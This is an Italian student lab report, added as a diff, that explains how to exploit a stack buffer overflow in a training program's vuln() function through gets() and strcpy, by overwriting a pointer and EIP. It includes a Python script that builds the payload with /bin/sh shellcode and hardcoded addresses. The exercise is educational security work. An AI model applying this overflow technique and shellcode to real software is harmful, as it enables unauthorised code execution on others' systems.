@@ -1,0 +1,73 @@
+Relazione richiesta 1
+
+La richiesta è di exploitare la funzione vuln. Osservando la funzione in quesione vediamo che c'è la possibilità di fare un bufferoverlow in concomitanza della strcpy, infatti se si copiassero più di 200 caratteri dentro buf si andrebbe oltre al limite dell'array fino ad arrivare a EIP e cambiare il flusso del programma.
+
+Dobbiamo quindi saltare a vuln.
+Per farlo ho osservato la funzione get_input() e ho notato che ha due potenziali vulnerabilità, in concomitanza con le due gets().
+
+Ho pensato fin da subito di usare la seconda, la quale scrive su buffer1 e, inserendo più di 20 caratteri scrive su buffer fino ad arrivare, dopo altri 128 caratteri,  al puntatore buf* e poi, con il giusto padding, a  EIP.
+
+A noi non serve solo arrivare ad EIP, ma anche fare in modo che *buf punti alla variabile globale string, così da poter scrivere in posizione 10, 11 e 12 rispettivamente i caratteri a,b,c che quindi facciano entrare nell'if della funzione vuln(), così da eseguire la vulnerabilità.
+
+
+In nostro payload finale saraà quindi così composto:
+
+-Un input di qualche carattere con uno \n alla fine per superare la prima gets() (che come ho spiegato non ci serve)
+-11 a (che verranno poi copaite dalla 0-esima posizione alla 10 di string)
+-1 b (che verrà poi copiata nella 11 posizione di string)
+-1 c (che verrà poi copiata nella 12 posizione di string)
+-lo shellCode (che quindi sarà l'indirizzo finale al quale saltare dopo vuln, ovvero string+13)
+-Un po' di caratteri per arrivare fino a 148 e posizionarci subito prima, in get_input(), a *buf
+-l'indirizzo che vogliamo inserire dentro *buf, ovevro quello di string, così che la seconda strcpy copi dentro string, trovato con "info variables string"
+-un po' di caratteri per arrivare fino all'EIP di get_input(), trovati con "pattern create 20" e poi troncato  
+-L'indirizzo da mettere dentro EIP così da cambaire il flusso di esecuzione. In questo caso sarà quello di vuln(), trovato con "pdisass vuln"
+-Un po' di caratteri per arrivare fino ad EIP di vuln(), anche in questo caso ho usato "pattern create 40"
+-indirizzo al quale saltare dopo l'esecuzione di vuln() che è buf+13 (andrebbe bene anche string+13). 
+
+
+
+
+
+
+
+Ecco il codice usato:
+
+
+import os 
+import struct 
+
+shellcode=(b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")
+
+string=0x0804a060 #indirizzo dell'array globale da 300
+buf_vuln=0xbffff178
+vuln=0x0804849b #indirizzo della funzione vuln trovato con pdisass
+
+
+finalInput1="zz\n" #input solo per superare la prima get
+
+finalInput2= "a"*11
+finalInput2+= "b"
+finalInput2+= "c"
+finalInput2+=shellcode
+finalInput2+= "z"*(148-len(finalInput2))
+
+finalInput2+=struct.pack("I", string) #faccio in modo che *buf punti all'indirizzo di string
+finalInput2+="AAA%AAsA" #ho creato un pattern di 20 per vedere cosa finisse in EIP e poi ho tagliato prima
+
+finalInput2+=struct.pack("I", vuln)
+finalInput2+="AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0A" #altri caratteri per arrivare fino a eip di vuln
+finalInput2+=struct.pack("I", buf_vuln+13) #infine inserisco l'indirizzo al quale saltare
+
+
+
+
+#stampe di debugging
+print(len(finalInput1))
+print(len(finalInput2))
+print(len(finalInput1+finalInput2))
+
+f=open("badfile", "w")
+f.write(finalInput1+finalInput2)
+f.close()
+
+
